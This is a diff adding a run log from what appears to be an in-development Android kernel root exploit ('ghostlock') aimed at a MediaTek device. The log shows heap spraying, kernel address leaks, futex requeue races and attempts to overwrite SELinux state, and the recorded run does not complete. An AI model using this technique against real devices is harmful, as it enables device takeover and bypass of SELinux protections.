@@ -1,0 +1,105 @@
+[*] kernel: 6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
+[+] resolved profile loaded: 6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
+[*] cpu pair: main=0 consumer=1
+[*] runtime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
+[*] debug.execution.begin release=6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
+[*] debug.execution.recommended_cpus.main=0
+[*] debug.execution.recommended_cpus.consumer=1
+[*] debug.execution.selected_cpus.main=0
+[*] debug.execution.selected_cpus.consumer=1
+[*] debug.execution.heap.prepare_max_attempts=4
+[*] debug.execution.heap.prepare_timeout_ms=240000
+[*] debug.execution.heap.kernelsnitch_timeout_ms=60000
+[*] debug.execution.race.route_wait_ms=1000
+[*] debug.execution.race.setup_settle_us=50000
+[*] debug.execution.race.state_poll_interval_us=1000
+[*] debug.execution.stages.w1_attempts=15
+[*] debug.execution.stages.w1_settle_us=100000
+[*] debug.execution.stages.w1_scratch_repair_attempts=3
+[*] debug.execution.stages.w2_attempts=15
+[*] debug.execution.stages.w2_settle_us=100000
+[*] debug.execution.stages.w3_chain_rounds=3
+[*] debug.execution.stages.w3_attempts=6
+[*] debug.execution.stages.w3_settle_us=50000
+[*] debug.execution.routes.tcp_zerocopy.attempts=0
+[*] debug.execution.routes.tcp_zerocopy.arm_sequence=0
+[*] debug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=0
+[*] debug.execution.routes.select_stack.enter_delay_us=0
+[*] debug.execution.routes.select_stack.timeout_us=0
+[*] debug.execution.routes.select_stack.consumer_max_calls=1
+[*] debug.execution.routes.select_stack.consumer_burst_calls=1
+[*] debug.execution.handoff.pre_dispatch_settle_ms=2000
+[*] debug.execution.handoff.module_poll_attempts=30
+[*] debug.execution.handoff.module_poll_interval_ms=100
+[*] debug.execution.handoff.enforce_poll_attempts=200
+[*] debug.execution.handoff.enforce_poll_interval_ms=100
+[*] debug.execution.end
+[*] soc: mtk; kernel_phys_load=0x80000000
+[*] init_cred image=ffffffc082553830 alias=ffffff8002553830
+[*] root script written path=/data/local/tmp/.ghostlock_root.sh bytes=6081
+[*] iomem cache: no usable dump, keeping the built-in geometry
+[+] startup context pid=6376 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=41798 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=6376 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=6376 label=ghostlock_oplus slide=pselect main=pselect
+[+] p0 profile pid=6376 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80025321b0 bootid_data=ffffff80027e8d48 init_task=ffffff800253dac0 root_tg=ffffff80027778c0 sysctl_bootid=ffffff80027e8d48
+[*] p0 kernel_phys_load=0000000080000000 delta=0000000000000000
+[*] main thread running on cpu=0
+[*] [T+0ms] exploit start
+[*] [T+0ms] pre-W1 drain
+[*] W1: SELinux attempt 1/15
+[*] === W1: SELinux === target=0xffffff80027c6960 mode=1 leaf=0
+[*] [T+47ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=8) +137ms
+[*] [spray] finding futex collisions... +289ms
+[*] [spray] early collision screen 6/3 at 37%
+[*] [spray] futex collisions found +803ms
+[*] [spray] mm_struct leaked=0xffffff830b481900 +808ms
+[*] [spray] payload ready +809ms
+[-] page ffffff830b480000 stores an even byte over selinux_state.initialized; taking another
+[-] prepare_kernel_page retry 1/4 +876ms
+[*] [spray] mm spray + kernelsnitch ready (cpu=8) +127ms
+[*] [spray] finding futex collisions... +276ms
+[*] [spray] early collision screen 10/3 at 37%
+[*] [spray] futex collisions found +781ms
+[*] [spray] mm_struct leaked=0xffffff830bdc7300 +785ms
+[*] [spray] payload ready +786ms
+[-] page ffffff830bdc0000 stores an even byte over selinux_state.initialized; taking another
+[-] prepare_kernel_page retry 2/4 +1732ms
+[*] [spray] mm spray + kernelsnitch ready (cpu=8) +121ms
+[*] [spray] finding futex collisions... +273ms
+[*] [spray] early collision screen 3/3 at 37%
+[*] [spray] futex collisions found +779ms
+[*] [spray] mm_struct leaked=0xffffff830dd6ad00 +785ms
+[*] [spray] payload ready +787ms
+[-] page ffffff830dd68000 stores an even byte over selinux_state.initialized; taking another
+[-] prepare_kernel_page retry 3/4 +2579ms
+[*] [spray] mm spray + kernelsnitch ready (cpu=8) +129ms
+[*] [spray] finding futex collisions... +287ms
+[*] [spray] early collision screen 5/3 at 37%
+[*] [spray] futex collisions found +819ms
+[*] [spray] mm_struct leaked=0xffffff8309a52800 +823ms
+[*] [spray] payload ready +825ms
+[*] prepare_kernel_page ok attempt=4 +3475ms
+[*] [T+3522ms]   heap spray done
+[*] [route] creating waiter/owner/consumer
+[*] consumer thread running on cpu=1
+[*] [route] waiter parked; owner started
+[*] [route] CMP_REQUEUE_PI ret=-1 errno=11; waiting route_done
+[*] fd_graph route geometry: eventpoll_size=208 epitem_ep=72 epitem_fllink=80 pipe_buffer=40 pipe_flags=24 pipe_slots=32 pipe_ring=1280 pipe_object=2048 graph_width=96 graph_fanout=256 graph_edges=24576 objects_per_order3=16
+[*] fd_graph: reclaim_small complete fds=240
+[*] fd_graph: drain_small complete fds=240
+[*] [spray] early collision screen 3/1 at 50%
+[*] fd_graph: collisions=2 page=ffffff8309a50000
+[*] fd_graph: drain_expand complete fds=240
+[*] fd_graph: reclaim_expand complete fds=240
+[*] fd_graph: step=0 delay_us=0 pipe_fill=8
+[*] fd_graph: step=1 delay_us=1 pipe_fill=8
+[*] fd_graph: step=2 delay_us=2 pipe_fill=8
+[*] fd_graph: step=3 delay_us=4 pipe_fill=8
+[*] fd_graph: step=4 delay_us=8 pipe_fill=8
+[*] fd_graph: step=5 delay_us=12 pipe_fill=8
+[*] fd_graph: step=6 delay_us=20 pipe_fill=8
+[*] fd_graph: step=7 delay_us=32 pipe_fill=8
+[*] fd_graph: step=8 delay_us=48 pipe_fill=8
+[*] fd_graph: step=9 delay_us=64 pipe_fill=8
+[*] fd_graph: RACE_SUMMARY tries=10 pipe_fill_hits=10 chain_hits=0 bit4_hits=0 delivery=not-implemented target=ffffff80027c6960
